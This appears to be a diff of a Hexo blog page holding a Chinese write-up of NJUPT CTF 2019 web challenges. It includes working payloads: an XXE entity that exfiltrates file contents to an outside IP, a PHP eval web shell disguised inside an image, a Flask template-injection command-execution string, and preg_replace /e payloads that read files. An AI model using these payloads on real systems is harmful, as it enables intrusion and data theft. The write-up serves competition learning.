@@ -55,18 +55,18 @@
   };
 </script>
 
-  <meta name="description" content="题目挺好玩的，很多不会，慢慢写还是有点思路的，学到了很多新知识。1.Fake XML cookbook 测试了一下，没有回显，所以进行参数实体的注入，在vps上放一个xml文件，让它加载，文件内容如下1&amp;lt;!ENTITY % payload &quot;&amp;lt;!ENTITY &amp;amp;#x25; send SYSTEM &amp;apos;http:&#x2F;&#x2F;47.103.62.94:8080&#x2F;?content=%file;">
+  <meta name="description" content="题目挺好玩的，很多不会，慢慢写还是有点思路的，学到了很多新知识。Fake XML cookbook测试了一下，没有回显，所以进行参数实体的注入，在vps上放一个xml文件，让它加载，文件内容如下1&amp;lt;!ENTITY % payload &quot;&amp;lt;!ENTITY &amp;amp;#x25; send SYSTEM &amp;apos;http:&#x2F;&#x2F;47.103.62.94:8080&#x2F;?content=%file;&amp;apos;&amp;g">
 <meta name="keywords" content="CTF,web">
 <meta property="og:type" content="article">
 <meta property="og:title" content="NJUPT CTF 2019 web部分writeup">
 <meta property="og:url" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;11&#x2F;24&#x2F;NJUPT%20CTF%202019%20web%E9%83%A8%E5%88%86writeup&#x2F;index.html">
 <meta property="og:site_name" content="LiM&#39;s blog">
-<meta property="og:description" content="题目挺好玩的，很多不会，慢慢写还是有点思路的，学到了很多新知识。1.Fake XML cookbook 测试了一下，没有回显，所以进行参数实体的注入，在vps上放一个xml文件，让它加载，文件内容如下1&amp;lt;!ENTITY % payload &quot;&amp;lt;!ENTITY &amp;amp;#x25; send SYSTEM &amp;apos;http:&#x2F;&#x2F;47.103.62.94:8080&#x2F;?content=%file;">
+<meta property="og:description" content="题目挺好玩的，很多不会，慢慢写还是有点思路的，学到了很多新知识。Fake XML cookbook测试了一下，没有回显，所以进行参数实体的注入，在vps上放一个xml文件，让它加载，文件内容如下1&amp;lt;!ENTITY % payload &quot;&amp;lt;!ENTITY &amp;amp;#x25; send SYSTEM &amp;apos;http:&#x2F;&#x2F;47.103.62.94:8080&#x2F;?content=%file;&amp;apos;&amp;g">
 <meta property="og:locale" content="en">
 <meta property="og:image" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;11&#x2F;24&#x2F;NJUPT%20CTF%202019%20web%E9%83%A8%E5%88%86writeup&#x2F;1574587789404.png">
 <meta property="og:image" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;11&#x2F;24&#x2F;NJUPT%20CTF%202019%20web%E9%83%A8%E5%88%86writeup&#x2F;1574588638162.png">
 <meta property="og:image" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;11&#x2F;24&#x2F;NJUPT%20CTF%202019%20web%E9%83%A8%E5%88%86writeup&#x2F;1574779072769.png">
-<meta property="og:updated_time" content="2019-11-26T15:00:52.364Z">
+<meta property="og:updated_time" content="2019-11-28T12:40:02.667Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;11&#x2F;24&#x2F;NJUPT%20CTF%202019%20web%E9%83%A8%E5%88%86writeup&#x2F;1574587789404.png">
   <link rel="canonical" href="https://li1m.github.io/2019/11/24/NJUPT%20CTF%202019%20web%E9%83%A8%E5%88%86writeup/">
@@ -308,7 +308,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2019-11-26 23:00:52" itemprop="dateModified" datetime="2019-11-26T23:00:52+08:00">2019-11-26</time>
+                <time title="Modified: 2019-11-28 20:40:02" itemprop="dateModified" datetime="2019-11-28T20:40:02+08:00">2019-11-28</time>
               </span>
             
           
@@ -353,8 +353,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>题目挺好玩的，很多不会，慢慢写还是有点思路的，学到了很多新知识。</p><p>1.Fake XML cookbook </p><p>测试了一下，没有回显，所以进行参数实体的注入，在vps上放一个xml文件，让它加载，文件内容如下</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % payload "&lt;!ENTITY &amp;#x25; send SYSTEM 'http://47.103.62.94:8080/?content=%file;'&gt;"&gt; %payload;</span><br></pre></td></tr></table></figure><a id="more"></a>
-
+        <p>题目挺好玩的，很多不会，慢慢写还是有点思路的，学到了很多新知识。</p><h1 id="Fake-XML-cookbook"><a href="#Fake-XML-cookbook" class="headerlink" title="Fake XML cookbook"></a>Fake XML cookbook</h1><p>测试了一下，没有回显，所以进行参数实体的注入，在vps上放一个xml文件，让它加载，文件内容如下</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % payload "&lt;!ENTITY &amp;#x25; send SYSTEM 'http://47.103.62.94:8080/?content=%file;'&gt;"&gt; %payload;</span><br></pre></td></tr></table></figure><a id="more"></a>
 
 
 
@@ -368,8 +367,7 @@
 
 
 
-<p>2.easyphp</p>
-<p>是一个函数绕过题，挺好玩的，</p>
+<h1 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h1><p>是一个函数绕过题，挺好玩的，</p>
 <p>1st</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'num'</span>] !== <span class="string">'23333'</span> &amp;&amp; preg_match(<span class="string">'/^23333$/'</span>, $_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'1st ok'</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'23333333'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -393,8 +391,7 @@
 
 
 
-<p>3.Upload your Shell</p>
-<p>看源码，发现了这个./index.php?action=imgs.html</p>
+<h1 id="Upload-your-Shell"><a href="#Upload-your-Shell" class="headerlink" title="Upload your Shell"></a>Upload your Shell</h1><p>看源码，发现了这个./index.php?action=imgs.html</p>
 <p>点进去看了一下，就是上传点，有文件类型检测，做一个图片马，copy 1.jpg/b+2.php/a 1.jpg(文件包含解析b表示二进制，a表示ascii码)，然后发现不能有&lt;?，这个之前考过，这样写就可以啦</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">"php"</span>&gt;@<span class="keyword">eval</span>($_POST[<span class="string">'a'</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
 
@@ -403,8 +400,7 @@
 
 
 
-<p>4.hacker_backdoor</p>
-<p>这个题目也是绕过，waf ban了所有函数和eval，assert，但是可以用字符串拼接绕过，这个题也学到了很多知识，原来eval也可以执行一段代码。</p>
+<h1 id="hacker-backdoor"><a href="#hacker-backdoor" class="headerlink" title="hacker_backdoor"></a>hacker_backdoor</h1><p>这个题目也是绕过，waf ban了所有函数和eval，assert，但是可以用字符串拼接绕过，这个题也学到了很多知识，原来eval也可以执行一段代码。</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//nctf2019.x1ct34m.com:60004/?code=$a='php'.'info';%0a$a();&amp;useful=index.php</span></span><br></pre></td></tr></table></figure>
 
 <p>先看一下phpinfo()的disable_function，发现ban了很多函数还包括scandir，readfile，file_get_contents这样的函数（这里没仔细看，其实它放了一个命令执行函数proc_open）后面会发现这个问题，先不说，进行常规步骤，我是找替代scandir，readfile这样的函数，发现了glob函数和highlight_file函数可以使用。</p>
@@ -417,8 +413,7 @@
 
 
 
-<p>5.flask</p>
-<p>额，这是一个Flask模板注入 ，具体原因可以看这篇文章    <a href="https://xz.aliyun.com/t/3679" target="_blank" rel="noopener">传送门</a></p>
+<h1 id="flask"><a href="#flask" class="headerlink" title="flask"></a>flask</h1><p>额，这是一个Flask模板注入 ，具体原因可以看这篇文章    <a href="https://xz.aliyun.com/t/3679" target="_blank" rel="noopener">传送门</a></p>
 <p>直接上payload</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://nctf2019.x1ct34m.com:<span class="number">40007</span>/&#123;&#123;<span class="string">''</span>.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().pop(<span class="number">59</span>).__init__.func_globals.linecache.os.popen(<span class="string">'ls ..'</span>).read()&#125;&#125;	//执行命令</span><br></pre></td></tr></table></figure>
 
@@ -427,14 +422,12 @@
 
 
 
-<p>6.True XML cookbook</p>
-<p>也是一个xxe，要通过xxe内网探测，读一下/proc/net/arp文件，这个文件用来显示当前路由器上，client的name，ip，mac，connect_type信息，具体介绍如下</p>
+<h1 id="True-XML-cookbook"><a href="#True-XML-cookbook" class="headerlink" title="True XML cookbook"></a>True XML cookbook</h1><p>也是一个xxe，要通过xxe内网探测，读一下/proc/net/arp文件，这个文件用来显示当前路由器上，client的name，ip，mac，connect_type信息，具体介绍如下</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">IP address       HW type     Flags       HW address            Mask     Device</span><br><span class="line">192.168.1.234    0x1         0x0         00:00:00:00:00:00     *        eth0</span><br><span class="line">192.168.1.241    0x1         0x0         00:00:00:00:00:00     *        eth0</span><br><span class="line"></span><br><span class="line">每个网络接口的arp表中dev包的统计</span><br><span class="line">IP address：IP地址（直连）</span><br><span class="line">HW type：硬件类型 </span><br><span class="line">23=0x17   strip (Metricom Starmode IP) </span><br><span class="line">01=0x01   ether (Ethernet) </span><br><span class="line">15=0xf      dlci (Frame Relay DLCI) </span><br><span class="line">Flags：</span><br><span class="line">HW address：MAC 地址</span><br><span class="line">Mask：</span><br><span class="line">Device：所在网络接口</span><br></pre></td></tr></table></figure>
 
 <p>之后一个一个试就可以了，结果如下</p>
 <p><img src="1574779072769.png" alt="1574779072769"></p>
-<p>7.replace</p>
-<p>这个题当时想到了是preg_replace()函数/e下的命令执行，随便测了下，没发现什么就没看了，现在发现其实也挺简单的，测试发现过滤了一些函数和引号，这里先给出payload，具体总结会在之后的文章，</p>
+<h1 id="replace"><a href="#replace" class="headerlink" title="replace"></a>replace</h1><p>这个题当时想到了是preg_replace()函数/e下的命令执行，随便测了下，没发现什么就没看了，现在发现其实也挺简单的，测试发现过滤了一些函数和引号，这里先给出payload，具体总结会在之后的文章，</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sub=<span class="number">1</span>&amp;pat=<span class="number">1</span>&amp;rep=var_dump(scandir(chr(<span class="number">46</span>).chr(<span class="number">46</span>).chr(<span class="number">47</span>).chr(<span class="number">46</span>).chr(<span class="number">46</span>).chr(<span class="number">47</span>).chr(<span class="number">46</span>).chr(<span class="number">46</span>).chr(<span class="number">47</span>)));	<span class="comment">//遍历目录</span></span><br></pre></td></tr></table></figure>
 
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sub=<span class="number">1</span>&amp;pat=<span class="number">1</span>&amp;rep=var_dump(readfile(chr(<span class="number">47</span>).chr(<span class="number">102</span>).chr(<span class="number">108</span>).chr(<span class="number">97</span>).chr(<span class="number">103</span>)))	<span class="comment">//读取flag</span></span><br></pre></td></tr></table></figure>
@@ -527,6 +520,8 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Fake-XML-cookbook"><span class="nav-number">1.</span> <span class="nav-text">Fake XML cookbook</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#easyphp"><span class="nav-number">2.</span> <span class="nav-text">easyphp</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Upload-your-Shell"><span class="nav-number">3.</span> <span class="nav-text">Upload your Shell</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#hacker-backdoor"><span class="nav-number">4.</span> <span class="nav-text">hacker_backdoor</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#flask"><span class="nav-number">5.</span> <span class="nav-text">flask</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#True-XML-cookbook"><span class="nav-number">6.</span> <span class="nav-text">True XML cookbook</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#replace"><span class="nav-number">7.</span> <span class="nav-text">replace</span></a></li></ol></div>
+        
       </div>
       <!--/noindex-->
 
@@ -541,7 +536,7 @@
         
           <a href="/archives/">
         
-          <span class="site-state-item-count">7</span>
+          <span class="site-state-item-count">9</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -554,7 +549,7 @@
             <a href="/tags/">
           
         
-        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-count">7</span>
         <span class="site-state-item-name">tags</span>
         </a>
       </div>
@@ -591,14 +586,14 @@
     </span>
       <span class="post-meta-item-text">Symbols count total: </span>
     
-    <span title="Symbols count total">30k</span>
+    <span title="Symbols count total">33k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">Reading time total &asymp;</span>
     
-    <span title="Reading time total">27 mins.</span>
+    <span title="Reading time total">30 mins.</span>
 </div>
   <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v4.0.0
   </div>
